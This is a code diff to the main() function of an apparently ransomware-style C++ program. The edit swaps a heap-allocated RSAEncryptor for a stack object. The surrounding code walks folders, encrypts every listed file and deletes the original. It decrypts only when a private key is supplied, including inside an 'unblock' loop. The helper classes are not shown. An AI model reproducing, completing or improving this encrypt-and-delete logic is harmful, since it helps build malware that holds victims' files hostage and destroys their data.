@@ -33,7 +33,7 @@ int main(int argc, char *argv[])
     std::string key = "";
 
     FolderService folderservice;
-    RSAEncryptor* encryptor = new RSAEncryptor();
+    RSAEncryptor encryptor;
 
     if(argc == 2) {
         key = argv[1];
@@ -42,12 +42,12 @@ int main(int argc, char *argv[])
             exit(0);
         }
 
-        encryptor->checkPrivateKey(key);
+        encryptor.checkPrivateKey(key);
 
         std::vector<std::string> files = folderservice.list_files_for_decryption();
 
         for (std::string& filePath : files) {
-            encryptor->decryptFile(filePath, key);
+            encryptor.decryptFile(filePath, key);
         }
 
         exit(0);
@@ -56,7 +56,7 @@ int main(int argc, char *argv[])
     std::vector<std::string> files = folderservice.list_files_for_encryption();
 
     for (std::string& filePath : files) {
-        encryptor->encryptFile(filePath);
+        encryptor.encryptFile(filePath);
 
         try {
             remove(filePath);
@@ -80,12 +80,12 @@ int main(int argc, char *argv[])
             unblock = false;
         } else {
             try {
-                encryptor->checkPrivateKey(key);
+                encryptor.checkPrivateKey(key);
 
                 std::vector<std::string> files = folderservice.list_files_for_decryption();
 
                 for (std::string& filePath : files) {
-                    encryptor->decryptFile(filePath, key);
+                    encryptor.decryptFile(filePath, key);
 
                     try {
                         remove(filePath);
@@ -107,6 +107,5 @@ int main(int argc, char *argv[])
         }
     }
 
-    delete encryptor;
     return 0;
 }
